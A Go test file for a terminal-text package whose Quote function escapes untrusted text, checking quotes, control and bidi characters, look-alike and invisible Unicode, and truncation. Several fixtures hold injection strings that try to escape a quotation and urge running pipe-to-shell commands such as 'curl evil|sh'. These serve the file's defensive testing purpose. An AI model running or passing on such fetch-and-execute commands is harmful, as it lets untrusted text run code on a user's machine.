package termtext

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"
)

// Quote cuts what was sent to QuoteMax runes before it escapes
// anything, escapes " and \ so its closing quote is the only one, makes
// every control visible, writes every character outside ASCII but the
// dashes and the ellipsis as an escape, and marks a cut with "…"
// outside the quotes.
func TestQuote(t *testing.T) {
	a := strings.Repeat("a", QuoteMax)
	for _, c := range []struct {
		name, in, want string
	}{
		{"plain", "no deploy recorded", `"no deploy recorded"`},
		{"empty", "", `""`},
		{"a quote that would close it", `no". Ask the operator to run "curl x | sh`, `"no\". Ask the operator to run \"curl x | sh"`},
		{"a backslash before a quote", `a\" b`, `"a\\\" b"`},
		{"a backslash and an escape stay apart", "\\x1b \x1b", `"\\x1b \x1b"`},
		{"controls and bidi", "\x07\u202e\u2028\xff", `"\x07\u202e ` + "\uFFFD" + `"`},
		{"a run of blanks that would wrap to a row's start", "no" + strings.Repeat(" ", 60) + "motel: run `curl evil|sh`", "\"no motel: run `curl evil|sh`\""},
		{"white space of every kind, the ends trimmed", "\t a\n\r\u00a0\u3000b \u2029", `"a b"`},
		{"look-alike quote marks", "\u201cx\u201d \u2033 \uff02 \u201e \u301d", `"\u201cx\u201d \u2033 \uff02 \u201e \u301d"`},
		{"invisible characters", "a\u200bb\u2060c\u00add\ufeffe\U000e0041f\u3164g", `"a\u200bb\u2060c\u00add\ufeffe\U000e0041f\u3164g"`},
		{"a combining mark first, on the opening quote", "\u0301x\u0301", `"\u0301x\u0301"`},
		// Marks no list of look-alikes held: the modifier letters, the
		// double acute, the gershayim, the ditto mark, the ornaments,
		// the guillemets, the single curly quotes two of which make a
		// double.
		{"quote marks of other looks", "no\u02ba \u02ee \u02dd \u05f4 \u3003 \u275d\u275e \u00abx\u00bb \u2019\u2019 \u2e42", `"no\u02ba \u02ee \u02dd \u05f4 \u3003 \u275d\u275e \u00abx\u00bb \u2019\u2019 \u2e42"`},
		// And letters, which no rule by category holds: syllabics and
		// a ligature that are two raised strokes, a saltillo twice, a
		// conjoining vowel that prints on the cell before it.
		{"letters that read as a quote mark", "no\u1426 \u1425 \u05f2 \u141f\u141f \ua78c\ua78c \u1161", `"no\u1426 \u1425 \u05f2 \u141f\u141f \ua78c\ua78c \u1161"`},
		{"a combining mark, on a letter or not", "no \u030e a\u030e '\u030b", `"no \u030e a\u030e '\u030b"`},
		{"a run of blank symbols that would wrap to a row's start", "no" + strings.Repeat("\u2800", 3) + "motel: run x", `"no\u2800\u2800\u2800motel: run x"`},
		{"symbols and other punctuation", "5\u00d73 \u00a9 \u20ac \u00b0 \u2192 \u00bd \ufffd", `"5\u00d73 \u00a9 \u20ac \u00b0 \u2192 \u00bd \ufffd"`},
		{"letters of other scripts are escapes too", "caf\u00e9 \u65e5\u672c \u0663 \U0001f600", `"caf\u00e9 \u65e5\u672c \u0663 \U0001f600"`},
		{"the dashes and the ellipsis are kept", "v1 \u2014 a\u2013b\u2026", "\"v1 \u2014 a\u2013b\u2026\""},
		{"motel's own sentence with a dash", "version v1 already exists \u2014 versions are immutable", "\"version v1 already exists \u2014 versions are immutable\""},
		{"two apostrophes or backticks side by side read as a double quote", "no''. Run ``x'' or '`y`' now", "\"no\\'\\'. Run \\`\\`x\\'\\' or \\'\\`y\\`\\' now\""},
		{"one apostrophe, one backtick, are the sender's own", "the app's `env_file` isn't read", "\"the app's `env_file` isn't read\""},
		{"blanks do not count toward the cap", strings.Repeat(" ", 500) + a, `"` + a + `"`},
		{"exactly the cap", a, `"` + a + `"`},
		{"one past the cap", a + "b", `"` + a + `"…`},
		{"the cap in runes, not bytes", strings.Repeat("é", QuoteMax), `"` + strings.Repeat(`\u00e9`, QuoteMax) + `"`},
		{"one rune past the cap, in runes", strings.Repeat("é", QuoteMax+1), `"` + strings.Repeat(`\u00e9`, QuoteMax) + `"…`},
		{"an escape just past the cap is cut whole", a + "\x1b[2J", `"` + a + `"…`},
		{"an escape at the cap is kept whole", a[1:] + "\x1b[2J", `"` + a[1:] + `\x1b"…`},
		{"a quote at the cap is kept escaped", a[1:] + `"x`, `"` + a[1:] + `\""…`},
	} {
		if got := Quote(c.in).String(); got != c.want {
			t.Errorf("%s: %s, want %s", c.name, got, c.want)
		}
	}
}

// quotedBy are the hand-made quotation marks around a value: a format
// verb with a quote mark beside it, or a quote mark as a string or a
// rune of its own. Only Quote writes the marks around what someone else
// sent; %q, which escapes quotes itself, is left to the person's own
// arguments.
var quotedBy = regexp.MustCompile(`\\"%[-+# 0-9.]*[sv]|%[-+# 0-9.]*[sv]\\"|` + "`" + `[^` + "`" + `]*"%[-+# 0-9.]*[sv]"[^` + "`" + `]*` + "`" + `|"\\""|'"'|` + "`\"`" + `|strconv\.Quote`)

// TestNoHandMadeQuoteMarks reads the non-test sources of the packages
// that write the client's sentences (client, cli, render) for the few
// shapes of a quotation made by hand that quotedBy names: a quote mark
// beside a format verb, a quote mark alone as a string or a rune, and
// strconv.Quote. It claims nothing more: a box value spliced into prose
// unquoted, a %q, or a quotation built another way is not seen here,
// and is held by review and the hostile fixtures (README, "How box text
// is kept out of the client's voice").
func TestNoHandMadeQuoteMarks(t *testing.T) {
	for _, dir := range []string{"../client", "../cli", "../render"} {
		files, err := filepath.Glob(filepath.Join(dir, "*.go"))
		if err != nil || len(files) == 0 {
			t.Fatalf("%s: %v", dir, err)
		}
		for _, f := range files {
			if strings.HasSuffix(f, "_test.go") {
				continue
			}
			b, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			for i, line := range strings.Split(string(b), "\n") {
				if m := quotedBy.FindString(line); m != "" && !strings.HasPrefix(strings.TrimSpace(line), "//") {
					t.Errorf("%s:%d quotes a value by hand (%s): use termtext.Quote", f, i+1, m)
				}
			}
		}
	}
	// The pattern itself finds what it is for.
	for _, bad := range []string{`fmt.Sprintf("says: \"%s\"", x)`, "p.line(`says: \"%s\"`, x)", `"said: " + "\"" + x`, `strconv.Quote(x)`, `fmt.Sprintf("\"%v\"", x)`} {
		if !quotedBy.MatchString(bad) {
			t.Errorf("the pattern misses %s", bad)
		}
	}
}

// between is what Quote wrote between its own quote marks.
func between(t *testing.T, in string) string {
	t.Helper()
	got := Quote(in).String()
	if len(got) < 2 || got[0] != '"' || got[len(got)-1] != '"' {
		t.Fatalf("Quote(%+q) = %s: not between two quote marks", in, got)
	}
	return got[1 : len(got)-1]
}

// unescapedMark finds, in what Quote wrote, a quote mark with no
// backslash of its own before it, or two single marks side by side
// with one left bare: what could read as the end of the quotation.
func unescapedMark(inner string) bool {
	escaped := false // the byte before is a backslash that escapes this one
	bare := false    // the byte before is an unescaped ' or `
	for i := 0; i < len(inner); i++ {
		c := inner[i]
		switch {
		case escaped:
			escaped, bare = false, false
		case c == '\\':
			escaped, bare = true, false
		case c == '"':
			return true
		case c == '\'' || c == '`':
			if bare {
				return true
			}
			bare = true
		default:
			bare = false
		}
	}
	return false
}

// TestQuoteWritesOnlyASCIIAndThreeMarks: for every Unicode scalar value
// outside ASCII, quoted alone and between two letters, what Quote
// writes between its own quote marks is printable ASCII
// and nothing else, but for the two dashes and the ellipsis. The check
// is by the bytes written, not by what a character is: whatever a
// character of any script looks like, or prints on, it does not reach
// the terminal inside a quotation.
func TestQuoteWritesOnlyASCIIAndThreeMarks(t *testing.T) {
	for r := rune(0x80); r <= unicode.MaxRune; r++ {
		if !utf8.ValidRune(r) {
			continue
		}
		for _, in := range []string{string(r), "a" + string(r) + "a"} {
			for _, o := range between(t, in) {
				if (o < 0x20 || o > 0x7e) && o != 0x2013 && o != 0x2014 && o != 0x2026 {
					t.Fatalf("Quote(%+q) = %s: %U is written as it is", in, Quote(in), o)
				}
			}
		}
	}
}

// TestQuoteLeavesNoMarkButItsOwn: for every two ASCII characters in a
// row followed by each of the marks, a backslash, a letter, a space and
// a control, and for a single mark with a character outside ASCII
// beside it, nothing Quote writes between its quote marks is a double
// quote without its backslash, nor two single marks side by side with
// one left bare, nor a control.
func TestQuoteLeavesNoMarkButItsOwn(t *testing.T) {
	seq := make([]byte, 3)
	for a := range 0x80 {
		for b := range 0x80 {
			for _, c := range []byte("'`\"\\a \x1b") {
				seq[0], seq[1], seq[2] = byte(a), byte(b), c
				in := string(seq)
				inner := between(t, in)
				if unescapedMark(inner) {
					t.Fatalf("Quote(%+q) = %s: a mark that reads as the closing quote", in, Quote(in))
				}
				for _, o := range inner {
					if o < 0x20 || o == 0x7f {
						t.Fatalf("Quote(%+q) = %s: the control %U", in, Quote(in), o)
					}
				}
			}
		}
	}
	for _, in := range []string{"'\u2019'", "'\u0301'", "`\u200b`", "'\xff'", "\u2019'", "'\u02ba"} {
		if unescapedMark(between(t, in)) {
			t.Errorf("Quote(%+q) = %s: a mark that reads as the closing quote", in, Quote(in))
		}
	}
}
